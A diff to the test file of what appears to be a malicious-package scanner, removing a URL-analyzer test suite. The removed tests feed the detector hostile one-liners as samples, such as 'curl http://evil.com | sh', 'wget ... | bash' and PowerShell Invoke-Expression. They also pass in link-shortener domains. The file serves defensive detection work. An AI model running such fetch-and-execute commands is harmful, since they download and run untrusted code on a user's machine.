@@ -13,7 +13,6 @@ const { createEmptySummary } = require('../../out/scanner/models/scan-result');
 const { Severity, severityToString, stringToSeverity } = require('../../out/scanner/models/severity');
 const { shannonEntropy, findHighEntropyStrings } = require('../../out/scanner/analyzers/entropy-analyzer');
 const { countEvalUsage, countExecUsage, countHexStrings, countBase64Strings, detectStringArrayObfuscation } = require('../../out/scanner/analyzers/string-analyzer');
-const { extractUrls, findSuspiciousUrls, findPipedExecution } = require('../../out/scanner/analyzers/url-analyzer');
 const { checkTyposquat } = require('../../out/scanner/analyzers/typosquat-analyzer');
 const { runSignatureEngine } = require('../../out/scanner/engines/signature-engine');
 const { runHeuristicEngine } = require('../../out/scanner/engines/heuristic-engine');
@@ -1022,40 +1021,6 @@ suite('Area 7: String Analyzer Extended', () => {
   test('detectStringArrayObfuscation with 14 elements (below threshold)', () => {
     const arr = '["a","b","c","d","e","f","g","h","i","j","k","l","m","n"];';
     assert.strictEqual(detectStringArrayObfuscation(arr), false);
-  });
-});
-
-// ============================================================
-// AREA 7: Edge Cases - URL Analyzer Extended
-// ============================================================
-
-suite('Area 7: URL Analyzer Extended', () => {
-  test('extractUrls finds multiple URLs', () => {
-    const content = 'const a = "https://a.com"; const b = "http://b.org/path";';
-    const urls = extractUrls(content);
-    assert.strictEqual(urls.length, 2);
-  });
-
-  test('findSuspiciousUrls catches all suspicious domains', () => {
-    const domains = ['vercel.app', 'short.gy', 'bit.ly', 'tinyurl.com', 'is.gd', 'rb.gy', 'cutt.ly'];
-    for (const domain of domains) {
-      const content = `const u = "https://evil.${domain}/path"`;
-      const findings = findSuspiciousUrls(content);
-      assert(findings.length > 0, `Should detect ${domain}`);
-    }
-  });
-
-  test('findPipedExecution catches multiple patterns', () => {
-    const patterns = [
-      'curl http://evil.com | sh',
-      'wget http://evil.com | bash',
-      'Invoke-WebRequest http://evil.com',
-      'Invoke-Expression code',
-    ];
-    for (const p of patterns) {
-      const results = findPipedExecution(p);
-      assert(results.length > 0, `Should detect piped execution in: ${p}`);
-    }
   });
 });
 
